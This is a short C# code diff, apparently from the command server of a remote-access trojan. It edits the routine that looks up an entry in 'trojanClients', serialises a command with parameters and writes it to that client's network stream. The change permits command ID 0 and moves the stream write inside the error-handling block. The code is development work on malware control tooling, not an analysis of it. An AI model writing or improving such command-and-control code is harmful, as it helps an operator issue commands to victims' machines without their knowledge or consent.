@@ -86,7 +86,7 @@ namespace Server.TCP
         {
             int clientId = serverGUI.GetClientId();
             int commandId = serverGUI.GetCommandId();
-            if (clientId >= 0 && commandId > 0)
+            if (clientId >= 0 && commandId >= 0)
             {
                 var trojanClient = trojanClients[serverGUI.GetClientId()];
                 var client = trojanClient.Client;
@@ -99,12 +99,13 @@ namespace Server.TCP
                 Command command = new Command(commandId, serverGUI.GetParameters());
                 string output = JsonConvert.SerializeObject(command);
                 msg = System.Text.Encoding.ASCII.GetBytes(output);
-                if (stream.CanWrite)
-                {
-                    await stream.WriteAsync(msg, 0, msg.Length);
-                }
                 try
                 {
+
+                    if (stream.CanWrite)
+                    {
+                        await stream.WriteAsync(msg, 0, msg.Length);
+                    }
                     int i = 0;
                     if (stream.CanRead)
                     {
